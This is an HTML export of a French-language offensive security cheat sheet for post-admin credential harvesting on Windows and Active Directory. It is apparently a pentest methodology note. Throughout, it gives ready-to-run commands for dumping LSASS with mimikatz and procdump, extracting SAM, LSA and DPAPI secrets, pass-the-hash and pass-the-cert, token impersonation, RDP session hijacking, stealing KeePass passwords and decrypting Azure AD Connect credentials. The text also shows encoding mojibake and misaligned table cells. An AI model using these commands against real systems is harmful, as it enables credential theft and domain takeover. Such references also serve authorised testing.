<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>12-Admin Post exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>12-Admin Post exploit</h1><br/><p><strong>Phase 12 â€” Credential Harvesting &amp; Impersonation (post-admin access)</strong></p><p><ol><li>1. <h2>1. Extraire les secrets de LSASS.exe</h2></p><p></li></ol><table class="table"><tr><th>Contexte</th><th>Commandes / outils</th><th>But &amp; rÃ©sultat</th></tr><tr><td>LSASS protÃ©gÃ© (PPL)</td><td>`PPLdump64.exe c:\lsass.exe</td><td>pid&lt;br&gt;mimikatz &quot;privilege::debug&quot; &quot;processprotect /process:lsass.exe /remove&quot;`</td></tr><tr><td>Dump classique</td><td>procdump.exe -accepteula -ma lsass.exe lsass.dmp</td><td>Sauvegarde locale du dump</td></tr><tr><td>Analyse du dump</td><td>mimikatz &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;msf &gt; load kiwi creds_all</td><td>User + Pass (clair), NTLM â†’ Pass-the-Hash / Ticket</td></tr></table></p><p><ol><li>2. <h2>2. Extraire les secrets de la SAM / SECURITY</h2></p><p></li></ol><table class="table"><tr><th>Ã‰tape</th><th>Commande</th><th>Sortie</th></tr><tr><td>Dump via SMB</td><td>nxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pwd&gt; --sam ; msf &gt; hashdump</td><td>Hashes NTLM locaux</td></tr><tr><td>Via reg save</td><td>reg save HKLMSAM sam.hiv &amp; reg save HKLMSYSTEM sys.hivsecretsdump.py -system SYSTEM -sam SAM LOCAL</td><td>Hashes NTLM â†’ PTH</td></tr><tr><td>Sauvegarde Ã  distance</td><td>regcpy domain/&lt;user&gt;:&lt;pwd&gt;@&lt;ip&gt; backup -o \\&lt;srv&gt;\share</td><td>SAM + SYSTEM pour offline dump</td></tr></table></p><p><ol><li>3. <h2>3. Extraire les secrets de LSA</h2></li><li><code>mimikatz &quot;secrets::lsadump&quot; &quot;exit&quot;</code></li></ol></p><p><ul><li><code>reg save HKLMSECURITY sec.hiv</code> â†’ <code>secretsdump.py -system SYSTEM -security SECURITY</code></li></ul></p><p><ul><li>âžœ <em>Cached creds</em> (MsCache v2) + <em>User + Pass</em>.</li></ul></p><p></p><p></p><p><ol><li>4. <h2>4. DPAPI loot</h2></p><p></li></ol><table class="table"><tr><th>ScÃ©nario</th><th>Outils</th><th>RÃ©sultat</th></tr><tr><td>Cookies / masterkey</td><td>nxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pwd&gt; -M dpapi</td><td>Dump masterkey blobs</td></tr><tr><td>User masterkey</td><td>dpapi.py domain/&lt;user&gt;:&lt;pwd&gt;@&lt;target&gt;SharpDPAPI.exe triage</td><td>Fichiers .masterkey</td></tr><tr><td>Bruteforce</td><td>DPAPImk2john.py *.masterkey &gt; crackme.john</td><td>DPAPImk ðŸŸ§</td></tr></table></p><p><ol><li>5. <h2>5. Impersonate / Pass-the-Hash / Cert</h2></p><p></li></ol><table class="table"><tr><th>MÃ©thode</th><th>Commande</th><th>Gain</th></tr><tr><td>Token impersonation</td><td>msf &gt; use incognito â†’ list_tokens / impersonate_token domain\\admin</td><td>ACL + User + Pass</td></tr><tr><td>runas /netonly</td><td>nxc exec -u localAdmin -p &lt;pwd&gt; -CMD &lt;cmd&gt;</td><td>ExÃ©cution en contexte admin</td></tr><tr><td>Pass-the-Cert (AD CS)</td><td>`masky -d  -u  -p  -k</td><td>-h  -a certificate`</td></tr><tr><td>RDP session hijack</td><td>psexec.exe -i &lt;sid&gt; cmd</td><td>RDP takeover</td></tr></table></p><p><ol><li>6. <h2>6. Divers &amp; persistance</h2></li><li><strong>Find users</strong> : <code>smbmap -r -host-file ./computers.txt -u &lt;user&gt; -p &lt;pwd&gt; -d &lt;dom&gt; -R C$|Users</code> â†’ nom dâ€™utilisateur.</li></ol></p><p><ul><li><strong>KeePass</strong> :</li></ul></p><p><code>KeepPw plug-in add -u &lt;user&gt; -p &lt;pwd&gt; -d &lt;dom&gt; -l target -plugin KeeFarce</code><code></code></p><p><code></code>âžœ <em>User + Pass</em> depuis DB KeePass.</p><p><ul><li><strong>Azure AD Connect</strong> : <code>azuread_decrypt_msol_v2.ps1</code> puis <code>secretsdump.py -u &lt;user&gt; -p &lt;pwd&gt; -d msol</code> âžœ <em>DCSYNC</em> possible.</li></ul></p><p></p><p></p><p><strong>Livrables phase 12</strong><ul><li>Dumps <strong>LSASS</strong>, <strong>SAM/SECURITY</strong>, masterkeys DPAPI : <em>User/Pass clairs</em>, <strong>NTLM</strong>, <em>tickets Kerberos</em>.</li></ul></p><p><ul><li>Techniques <em>Pass-the-Hash / Pass-the-Ticket / Pass-the-Certificate</em> prÃªtes pour rebondir.</li></ul></p><p><ul><li>Persistance par tokens, certificats, DPAPI, KeePass, sessions RDP dÃ©tournÃ©es.</li></ul></p><p></p><p></p></div>
</body>
</html>
